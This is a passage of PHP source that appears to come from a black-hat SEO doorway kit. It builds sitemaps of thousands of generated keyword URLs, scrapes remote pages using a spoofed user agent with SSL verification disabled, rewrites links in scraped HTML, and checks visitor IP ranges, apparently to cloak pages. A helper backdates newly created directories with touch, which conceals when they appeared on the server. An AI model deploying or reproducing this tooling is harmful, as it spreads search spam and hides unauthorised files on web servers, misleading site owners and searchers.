		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		//print_r( $value.$curphp."   ".$first."   ".$last);		if($first===false && $last===false && $checkTxt===false)
		{
			
			$url=$serpath ."/". $filePres . PRENAME . '-' . basename($value) .$fileEnds;			$put_str .= $url . PHP_EOL;				
		}
	}
		$gFile =  'urls.txt';		echo '<br/>'.$gFile.'';
		@unlink($gFile);		file_put_contents($gFile,$put_str);		echo "生成成功！<br/>";	
}
//生成sitemap.xml文件，超出4000个则换一个xml文件；参数$c=1生成原始路径的sitemap，$c=2则生成映射后的路径
//$dir目录参数


function print_map2($filenames,$c=1,$jdt=1){

	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);
				$url = getalink($tempSid,$tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$put_str = $mapPre . $str . $mapEnd;
				header("Content-type: text/xml");
				echo $put_str;
				return;		
			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		
		$put_str = $mapPre . $str . $mapEnd;		
		header("Content-type: text/xml");
		echo $put_str;

	}
	
	unset($tempArr1);	unset($filenames);	
}

function print_map($filenames,$c=1,$jdt=1){
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);		
		$url = getalink($tempSid,$tempPid);	
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$put_str = $mapPre . $str . $mapEnd;
				header("Content-type: text/xml");
				echo $put_str;
				return;			
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		
		$put_str = $mapPre . $str . $mapEnd;
		header("Content-type: text/xml");		
		echo $put_str;

	}
	
	unset($tempArr1);	unset($filenames);		
}

function gsitemap2($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);
				$url = getalink($tempSid,$tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  '../sitemap/sitemap' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemap/sitemap' . $gnumber .'.xml';		$gnumber++;		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	
	echo "生成sitemap成功！";	
}
function gsitemap($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;	
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);		
		$url = getalink($tempSid,$tempPid);	
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  '../sitemap/sitemap' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;				
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemap/sitemap' . $gnumber .'.xml';		echo '<br/>'.$gFile.'<br/>';		
		$gnumber++;
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
}


  
function fillUrl($str = '', $url){
	$relur = '#(?:href|src) ?= ?"([^"]+)"#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
				$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}elseif(strstr($values, "..")){
				
				// echo $urlInfo['host'];				// echo str_replace(basename($url),"",$url);				// die();				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}
		}
	}	
	
	
	$relur = '#(?:href|src) ?= ?\'([^\']+)\'#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);	
	// print_r($matches[1]);	
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
					$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}elseif(strstr($values, "..")){
				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}
		}
	}
	return $str;}
function auto_read($str, $charset='UTF-8') {
	$list = array('EUC-JP', 'Shift_JIS', 'UTF-8',  'iso-2022-jp');
	$encode = mb_detect_encoding($str, $list);	// echo $encode;die();	
	if($encode == 'UTF-8'){
		return $str;	}else{
		return mb_convert_encoding($str, $charset, $encode);	}
	 
}
function detect_encoding($file){
	$list = array('GBK', 'UTF-8', 'UTF-16LE', 'UTF-16BE', 'ISO-8859-1');	$str = file_get_contents($file);	foreach ($list as $item) {
		$tmp = mb_convert_encoding($str, $item, $item);		if (md5($tmp) == md5($str)) {
		
			return $item;		}
	}
	return null;}
function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;        $i = 0;        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);             if($i++ >= $loop) break;        }
	return $data;}
 
function curl_get_from_webpage_one_time($url,$proxy=''){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}



	
//



function my_mkdir($dir){
		global  $fitime;
		if(!is_dir($dir)){
			mkdir($dir);
			@touch($dir, $fitime, $fitime);   
		} 
	}
	

	
	function generate_dir_file($gDir=''){
		
		global $hostDir;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;
		
		if(!strstr($gDir,$hostDir))
			$dir = $hostDir;
		else
			$dir = '';


		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= DIRECTORY_SEPARATOR . $arr[$i];
			my_mkdir($dir);
		}
		
		return $dir;
	}
		
	
	function getalink($sid,$pid){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
		$ms = $arrnametime[$pid % count($arrnametime)];		
		
		$keyNum = $arrKeywz[$pid % count($arrKeywz)];		
		$keyWordKey = $pid % 10;		$keyStrKey = $pid % strlen("icedrkswzjhpnxoyvumfatblgq");		$keyArr = array();		$flag = 0;		
		if($ms == 2 or $ms ==4){
			if($keyNum >= 9){
				$fg = 4;			}elseif($keyNum >= 7){
				 $fg = 3;			}else{
				 $fg = 2;			}
		}
		
		for($i=0;$i<$keyNum;$i++){
			$tempNum = $arr_word[$i][$keyWordKey];			$tempstr = '';			for($j=0;$j<$tempNum;$j++)
				$tempstr .= $strRand[$flag++]{$keyStrKey};			
			$keyArr[$i] = $tempstr;		}
		
		$SidWz = $sid % $keyNum;		$PidWz = $pid % $keyNum;		$linkCenter = '';
		
		if(JDT == 3){
			for($i=0;$i<$keyNum;$i++){
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';			
			}
			$linkCenter .= $linkCenter . "#llq";		
			$linkCenter = str_replace('-#llq','',$linkCenter);	
			$linkCenter = str_replace('#llq','',$linkCenter);
			$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);				
			return $filePres.$linkCenter;		
			}
		
		
		
		
		if($ms == 1){
			for($i=0;$i<$keyNum;$i++){
				
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
			}
			
			$linkCenter .= "/";			$linkCenter = str_replace("-/","/",$linkCenter);			
		}elseif($ms == 2){
			for($i=0;$i<$keyNum;$i++){
				
					
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
				

				if($i == $fg-1){
					// $linkCenter .= '/';				
					$linkCenter .= '-';				
				}
			}
			
			$linkCenter .= "/";			$linkCenter = str_replace("-/","/",$linkCenter);			
		}elseif($ms == 3){
			for($i=0;$i<$keyNum;$i++){
				
					
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	
			}
			
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);			
			
		}elseif($ms == 4){
				for($i=0;$i<$keyNum;$i++){
				
				
				if($SidWz == $i && $i != 0)
					$linkCenter .= '-'. BZSITE . $sid .'-';
				elseif($SidWz == $i)
					$linkCenter .= BZSITE . $sid .'-';

				if($PidWz == $i && $i != 0)
					$linkCenter .= '-'. BZPRO . $pid .'-';	
				elseif($PidWz == $i)
				    $linkCenter .= BZPRO . $pid .'-';
				
				$linkCenter .= $keyArr[$i] .'';	

				if($i == $fg-1){
				// $linkCenter .= '/';				
					$linkCenter .= '-';			
					}
			}
			
			$linkCenter .= JTHZ;			$linkCenter = str_replace("-/","/",$linkCenter);			$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);		}
		
			$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);	
			
		return $filePres.$linkCenter;
	}
	
	
	function rmhtmltag($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#i';
		$str = preg_replace($rulers,'',$str);
		return $str;
	
	}
  
  
  function rmhtmltag2($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
	
	$rulers = '#<'.$tagname.'[^>]*>#i';
	$str = preg_replace($rulers,'',$str);
	$rulers = '#</'.$tagname.'>#i';
	$str = preg_replace($rulers,'',$str);
	return $str;
	
	}
	
	
	
// 

	
	
function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
		$ipmin=sprintf("%u",ip2long($val[0]));		$ipmax=sprintf("%u",ip2long($val[1]));
		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;}
 
  function RandAbcs($length = ""){
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_./:";
    return ($str);
} 
function get_real_ip(){
	
	$ip=false;	if(!empty($_SERVER["HTTP_CLIENT_IP"])){
		$ip = $_SERVER["HTTP_CLIENT_IP"];	}
	
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);		if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
		
		for ($i = 0; $i < count($ips); $i++) {
			if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])) {
				$ip = $ips[$i];				break;			}
		}
	}
	
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);}
 
//file end
